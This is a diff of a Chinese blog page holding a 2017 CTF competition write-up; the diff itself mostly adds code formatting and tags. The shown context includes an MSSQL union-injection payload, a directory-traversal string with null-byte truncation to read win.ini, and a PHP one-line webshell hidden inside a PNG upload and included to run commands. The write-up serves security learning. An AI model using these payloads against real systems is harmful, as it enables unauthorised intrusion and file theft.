@@ -22,7 +22,7 @@
 <meta property="og:image" content="https://www.wzsite.cn/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-21-47.jpg">
 <meta property="og:image" content="https://www.wzsite.cn/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-37-40.jpg">
 <meta property="og:image" content="https://www.wzsite.cn/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-40-49.jpg">
-<meta property="og:updated_time" content="2017-09-27T09:17:58.589Z">
+<meta property="og:updated_time" content="2017-09-28T12:22:03.263Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="CCTF（重庆绿盟杯）比赛writeUp">
 <meta name="twitter:description" content="WEB1靶机只扫描到22的ssh端口那么思路只有一个，只能爆破">
@@ -198,22 +198,22 @@
 <p>毕竟在这题浪费了很多时间，再也不想看到这题，23333</p>
 </blockquote>
 <h1 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h1><h2 id="MSSQL注入"><a href="#MSSQL注入" class="headerlink" title="MSSQL注入"></a>MSSQL注入</h2><p>比赛当时我找到的是一个shop7z的一个通用注入pkid<br>因为是MSSQL的数据库，不允许limit，故使用order by修改表序列，是一个显式union注入<br><strong>payload:</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Union%0a/!5000SelECt/%0a12,3,4,5,6,7,8,9,10,12,3,4,5,6,7,8,9,10,12,3,4,5,6,7,8,9,10,12,3,4,5,6,7,8,9,10,12,3,4,5,6,7,8%0aMSysAccessObjects%0aorder%0aby%0a1</div></pre></td></tr></table></figure></p>
-<p>因为是MSSQL,我平时积累不多,且把@@version替换上面数字会出false的页面，就懵逼了<br>大早上没吃早餐，被雨淋，还被空调吹得晕乎乎的，就就此放弃琢磨了这一道MSSQL注入，说实话还是积累太少。</p>
+<p>因为是MSSQL,我平时积累不多,且把<code>@@version</code>替换上面数字会出false的页面，就懵逼了<br>大早上没吃早餐，被雨淋，还被空调吹得晕乎乎的，就就此放弃琢磨了这一道MSSQL注入，说实话还是积累太少。</p>
 <h1 id="WEB3"><a href="#WEB3" class="headerlink" title="WEB3"></a>WEB3</h1><h2 id="一阶段——上传绕过"><a href="#一阶段——上传绕过" class="headerlink" title="一阶段——上传绕过"></a>一阶段——上传绕过</h2><p><strong>第一步扫描：</strong></p>
 <img src="/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-17-21.jpg" alt="21-17-21.jpg" title="">
 <p>发现开了很多端口<br>其中3389和80和8080是我们特别关注的<br>进去80是一个IIS的建设中的页面，没啥挖掘的<br>8080是一个Apache搭的应用下载市场<br>AWVS扫描发现有用的目录遍历漏洞</p>
 <img src="/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-21-28.jpg" alt="21-21-28.jpg" title="">
-<h5 id="有问题变量在模板参数tpl处"><a href="#有问题变量在模板参数tpl处" class="headerlink" title="有问题变量在模板参数tpl处"></a>有问题变量在模板参数tpl处</h5><p>被设置为../../../../../../../windows/win.ini%00.jpg<br><img src="/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-21-47.jpg" alt="21-21-47.jpg" title=""></p>
-<h3 id="科普"><a href="#科普" class="headerlink" title="科普"></a>科普</h3><p>还是科普一下<br>../是DOS命令及linux的shell命令的上层目录的意思<br>windows/win.ini，可以对照一下你C盘的C:\windows\win.ini<br>是一个系统的配置文件<br>%00是截断符，../回溯至win.ini后将读取win.ini%00.jpg<br>因为windows的读取特性，后缀名.jpg会被截断，将会读取win.ini达到任意文件读取的目的<br>然后其他两名队友Jason&amp;&amp;Unk0wn发现有一个图片上传点，但是上传的文件会被改名成静态图像文件，并且上传会过滤PHP等解析格式<br>随后我就有一个大胆的想法(其实当时只是想死马当活马医)<br>对，就是用目录遍历漏洞包含图像，使得上传的被我插入一句话木马的静态文件解析成php</p>
+<h5 id="有问题变量在模板参数tpl处"><a href="#有问题变量在模板参数tpl处" class="headerlink" title="有问题变量在模板参数tpl处"></a>有问题变量在模板参数tpl处</h5><p>被设置为<code>../../../../../../../windows/win.ini%00.jpg</code><br><img src="/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-21-47.jpg" alt="21-21-47.jpg" title=""></p>
+<h3 id="科普"><a href="#科普" class="headerlink" title="科普"></a>科普</h3><p>还是科普一下<br><code>../</code>是DOS命令及linux的shell命令的上层目录的意思<br>windows/win.ini，可以对照一下你C盘的C:\windows\win.ini<br>是一个系统的配置文件<br>%00是截断符，../回溯至win.ini后将读取win.ini%00.jpg<br>因为windows的读取特性，后缀名.jpg会被截断，将会读取win.ini达到任意文件读取的目的<br>然后其他两名队友Jason&amp;&amp;Unk0wn发现有一个图片上传点，但是上传的文件会被改名成静态图像文件，并且上传会过滤PHP等解析格式<br>随后我就有一个大胆的想法(其实当时只是想死马当活马医)<br>对，就是用目录遍历漏洞包含图像，使得上传的被我插入一句话木马的静态文件解析成php</p>
 <h3 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h3><p>上传点过滤PHP后缀，截断以及该Content-Type无济于事，索性直接上传PNG文件，保留文件头和结束标记，在中间插入一句话<br>大概是这样子的<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> system($_POST[<span class="number">1</span>]);<span class="keyword">echo</span> <span class="number">1</span>;<span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
 <img src="/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-37-40.jpg" alt="21-37-40.jpg" title="">
 <p>然后上传之后记录上传路径,将tpl改成静态png的路径。<br>大概是这样子的</p>
 <img src="/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-40-49.jpg" alt="21-40-49.jpg" title="">
 <p>毕竟环境已经关了，无法有更多详细的截图了，实在抱歉</p>
-<p>随后发现Png被解析成php了，并且提示,system()由于某些安全原因被禁用了</p>
+<p>随后发现Png被解析成php了，并且提示,<code>system()</code>由于某些安全原因被禁用了</p>
 <p>随后就将一句话构造成这样</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">$a=$_POST[<span class="number">2</span>];</div><div class="line"><span class="keyword">echo</span> $a.<span class="string">"\n"</span>;</div><div class="line">$b = scandir($a,<span class="number">1</span>);</div><div class="line">print_r($b);</div><div class="line">phpinfo();</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-<p>同样上传图片，包含新图片路径<br>庆幸的是phpinfo()是可以执行的，我们将post数据构造成当前目录路径</p>
+<p>同样上传图片，包含新图片路径<br>庆幸的是<code>phpinfo()</code>是可以执行的，我们将post数据构造成当前目录路径</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">POST_DATA: <span class="number">2</span>=getcwd();</div></pre></td></tr></table></figure>
 <p>执行后得到当前路径以及当前路径所有文件的名字,具体的路径没截图了，反正是C盘下的路径<br>以及当前目录下的flag_i4_H37e.txt文件<br>利用上面显示win.ini的方法，包含flag_i4_H37e.txt即可得到传马所得flag200分</p>
 <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>因为比赛是有三层靶机，而二层靶机是无法ping通的，所以应该是通过控制WEB3的主机,然后开启ip转发，使得我们能够继续渗透二层靶机。故我们接下来的思路是控制WEB3所在靶机</p>
@@ -527,6 +527,14 @@ getOwnMetadataKeys:function(t){return o(i(t),arguments.length<2?void 0:u(argumen
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">二进制</a>
               </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">XSS</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">WEB</a>
+              </li>
             
             <div class="clearfix"></div>
           </ul>
@@ -591,13 +599,13 @@ getOwnMetadataKeys:function(t){return o(i(t),arguments.length<2?void 0:u(argumen
 
     
     	<section class="tools-section tools-section-me" q-show="aboutme">
-		<div class="aboutme-wrap" id="js-aboutme">
+	
+  	  	
+  	  			<div class="aboutme-wrap" id="js-aboutme">
 			<div>
 			<br/>大学才开始接触电脑以及安全的菜鸡<br/>正在奋力学习中<br/><br/>愿不忘初心<br/><br/>感谢您的关注<br/>谢谢
 			</div>
 			</div>
-  	  	
-  	  		
   	  	
     	</section>
     
